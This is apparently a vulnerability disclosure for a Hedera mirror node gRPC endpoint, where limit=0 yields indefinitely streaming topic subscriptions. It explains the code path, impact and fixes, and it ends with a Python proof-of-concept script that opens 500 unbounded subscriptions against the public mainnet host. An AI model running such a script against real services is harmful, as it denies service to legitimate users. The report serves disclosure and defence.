### Title
Unbounded gRPC Topic Subscription via `limit=0` Enables Resource Exhaustion DoS

### Summary
Any unauthenticated external user can send a `ConsensusTopicQuery` with `limit=0`, which the mirror node maps directly to `TopicMessageFilter.limit=0`. Because `hasLimit()` returns `false` when `limit == 0`, no `.take()` bound is applied to the reactive stream, creating a subscription that streams indefinitely. An attacker opening many such connections exhausts server-side resources and degrades or denies service to legitimate subscribers.

### Finding Description
**Code path:**

1. `ConsensusController.toFilter()` ( [1](#0-0) ) passes `query.getLimit()` verbatim into the filter builder. When the client sends `limit=0`, the filter is built with `limit=0`.

2. `TopicMessageFilter.hasLimit()` ( [2](#0-1) ) returns `limit > 0`, so `limit=0` → `hasLimit()=false`.

3. The `@Min(0)` constraint on the field ( [3](#0-2) ) explicitly permits `0`, so Bean Validation never rejects it. Only `limit < 0` is rejected (as confirmed by the test at [4](#0-3) ).

4. In `TopicMessageServiceImpl.subscribeTopic()`, the `.take()` guard is gated on `filter.hasLimit()`: ( [5](#0-4) ) — with `limit=0` this block is skipped entirely, leaving the flux unbounded.

5. In `PollingTopicListener.poll()`, when `hasLimit()=false`, the local `limit` variable is set to `Integer.MAX_VALUE` ( [6](#0-5) ), causing the poller to repeat indefinitely.

6. `subscriberCount` is tracked as a Micrometer gauge ( [7](#0-6) ) but is **never checked** to reject new subscriptions — it is purely observational.

7. The only per-connection cap is `maxConcurrentCallsPerConnection = 5` ( [8](#0-7) ), which limits calls per TCP connection but does not bound the total number of connections or total active subscriptions.

**Root cause:** The semantic equivalence of `limit=0` (protocol meaning: "no limit") and the absence of any upper bound on concurrent subscriptions means a single unauthenticated client can hold arbitrarily many indefinitely-live subscriptions.

### Impact Explanation
Each unbounded subscription holds a Netty channel slot, a reactive scheduler thread from `Schedulers.boundedElastic()`, and periodic database polling connections. With no global subscriber cap enforced, an attacker can saturate the bounded elastic thread pool, exhaust the DB connection pool, and fill Netty's accept queue. Legitimate subscribers experience connection refusals, stalled streams, or complete service unavailability. Severity: **High** (unauthenticated DoS against a public-facing infrastructure service).

### Likelihood Explanation
The gRPC endpoint is publicly reachable by design (mirror nodes serve external clients). No authentication is required. The attacker needs only a gRPC client library and the ability to open multiple TCP connections. The attack is trivially scriptable, repeatable, and requires no special knowledge beyond the public HCS protobuf API. The `limit=0` value is the protobuf default for an unset `uint64` field, meaning even clients that simply omit the `limit` field trigger this path.

### Recommendation
1. **Enforce a minimum positive limit or treat `limit=0` as requiring an `endTime`:** Change `@Min(0)` to `@Min(1)` on `TopicMessageFilter.limit`, or add a cross-field validator that requires `endTime != null` when `limit == 0`.
2. **Enforce a global maximum concurrent subscriber count:** Check `subscriberCount` before accepting a new subscription and return `RESOURCE_EXHAUSTED` if the threshold is exceeded.
3. **Add a per-IP or per-connection subscription rate limit** in the gRPC interceptor layer to prevent a single client from opening many connections to bypass the per-connection call cap.
4. **Require `endTime` for all open-ended subscriptions** beyond a configurable maximum duration, forcing clients to re-subscribe rather than holding connections indefinitely.

### Proof of Concept
```python
import grpc
from concurrent.futures import ThreadPoolExecutor
# proto-generated stubs for ConsensusService
from com.hedera.mirror.api.proto import consensus_pb2, consensus_pb2_grpc
from com.hederahashgraph.api.proto.java import basic_types_pb2

MIRROR_NODE = "mainnet-public.mirrornode.hedera.com:443"
TOPIC_ID = basic_types_pb2.TopicID(shardNum=0, realmNum=0, topicNum=1234)

def open_unbounded_subscription(_):
    channel = grpc.secure_channel(MIRROR_NODE, grpc.ssl_channel_credentials())
    stub = consensus_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_pb2.ConsensusTopicQuery(
        topicID=TOPIC_ID,
        limit=0,          # <-- triggers hasLimit()=false, no .take() applied
        # no consensusEndTime set
    )
    for _ in stub.subscribeTopic(query):  # streams forever
        pass

# Open 500 concurrent unbounded subscriptions from a single host
with ThreadPoolExecutor(max_workers=500) as pool:
    pool.map(open_unbounded_subscription, range(500))
# Server-side subscriberCount climbs unboundedly; DB connection pool and
# boundedElastic thread pool exhaust; new legitimate subscribers are rejected.
```
